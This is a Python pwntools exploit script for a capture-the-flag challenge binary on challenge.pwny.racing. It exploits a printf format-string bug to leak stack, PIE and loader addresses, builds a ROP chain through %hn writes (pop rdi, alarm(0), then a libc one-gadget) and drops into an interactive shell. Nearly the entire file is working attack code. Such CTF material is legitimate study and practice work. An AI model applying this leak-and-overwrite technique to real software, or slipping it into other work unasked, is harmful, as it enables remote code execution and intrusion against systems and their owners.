#!/usr/bin/python
#
# martin

from pwn import *
import sys

host	= 'challenge.pwny.racing'
port	= 11532
binary	= '/local/ctf/pwny.racing/community.challenge.3/pchal'

# noASLR base:		0x555555554000
# 0000000000000B83  just before fsb printf

def get_leak( p, payload, restart ):
	p.recvuntil("input: ")
	p.sendline(payload)
	p.recvuntil("output: ")

	data = filter(None, p.recvline()[:-1].split("."))

	addrs = []
	for a in data:
		addrs += [ int(a, 16) ]

	manage_restart(p, restart)
	return addrs

def manage_restart( p, restart ):
	p.sendline("yes sir") if restart else p.sendline("nope")
	

def write( p, pos, size, b, restart ): 
	p.recvuntil("input: ")

	if b == 0:
		payload = "%"+str(pos)+"$"
	else:
		payload = "%"+str(b)+"x%"+str(pos)+"$"

	# manage size automatically
	if size == 0:
		if b < 0x100:
			payload += "hhn"
			wb = 1
		elif b < 0x10000:
			payload += "hn"
			wb = 2
		else:
			payload += "n"
			wb = 8
	else:
		if size == 1:
			payload += "hhn"		# byte
			wb = 1
		elif size == 2:
			payload += "hn"			# nibble
			wb = 2
		else:
			payload += "n"			# quad
			wb = 8

	print "write: size: %d, payload: %s"%(len(payload),payload)

	payload += "\x00"*(0x400-len(payload))
	p.send(payload)

	manage_restart(p,restart)
	return wb


# address is always written on pos 24, expecting pos 16 to be adjusted before write
def write_address( p, start_bytes, addr ):
	for i in xrange(3):
		nibble = addr >> (16*i) & 0xffff

		write(p, 24, 2, nibble, 1)
		start_bytes += 2

		write(p, 16, 2, start_bytes, 1)
		# sleep(0.1)

	# adjust to next position
	start_bytes += 2
	write(p, 16, 2, start_bytes , 1)
	return start_bytes


if len(sys.argv) > 1:
	if sys.argv[1] == 'r':
		p = remote(host, port)
	else:
		context.terminal = [ 'tmux', 'splitw', '-h' ]
		p = gdb.debug (binary, 
		'''
		b *0x555555554b83
		b *0x555555554d07
		dis 1
		c
		''')
else:
	p = process(binary)

offset_pie_leak		= 0xaf9			# address where printf() with FSB returns to 
offset_pie_pop_rdi	= 0xd73			# 0x0000000000000d73 : pop rdi ; ret
offset_pie_alarm_plt	= 0x7b0
offset_ld_libc		= 0x4019a0
offset_libc_magic	= 0x000000000010A38C

payload ="%16$p.%24$p"
[addr_stack_loc, addr_stack_rbp] = get_leak(p, payload, 1)

[addr_pie_leak, addr_ld_leak ] = get_leak(p, "%9$p.%30$p",1)

print "leaks:\npie:\t\t0x%08x\nstack addr1:\t0x%.08x\nsaved rbp:\t0x%.08x\nld: 0x%.08x"%(addr_pie_leak, addr_stack_loc, addr_stack_rbp, addr_ld_leak)

addr_pie_base	= addr_pie_leak -  offset_pie_leak
addr_libc_base	= addr_ld_leak - 0x4019a0
addr_libc_magic = addr_libc_base + offset_libc_magic

print "pie base: 0x%08x\nmaybe libc: 0x%.08x\nlibc magic: 0x%.08x"%(addr_pie_base, addr_libc_base, addr_libc_magic)

# move saved addr so it points to RET location
bytes_to_write = ( addr_stack_rbp & 0xffff ) +8
print "[I] expecting to write %x bytes"%bytes_to_write

# ret to gadget
write(p, 16, 2, bytes_to_write, 1)		# RET
write(p, 24, 2, (addr_pie_base + offset_pie_pop_rdi ) & 0xffff, 1)

# pop 0
bytes_to_write += 8
write(p, 16, 2, bytes_to_write, 1)
write(p, 24, 8, 0, 1)

# ret to alarm
bytes_to_write += 8
write(p, 16, 2, bytes_to_write, 1)

bytes_to_write = write_address(p, bytes_to_write, addr_pie_base + offset_pie_alarm_plt)
bytes_to_write = write_address(p, bytes_to_write, addr_libc_base + offset_libc_magic)

# this is what lea rsi, [rsp+0x70] loads in magic rce
bytes_to_write += 14*8
write(p, 16, 2, bytes_to_write, 1)
bytes_to_write = write_address(p, bytes_to_write, addr_stack_loc)

# restore the saved rbp addr
write(p, 16, 2, addr_stack_rbp & 0xffff, 0)

print "here be dragons"
p.clean()
p.interactive()
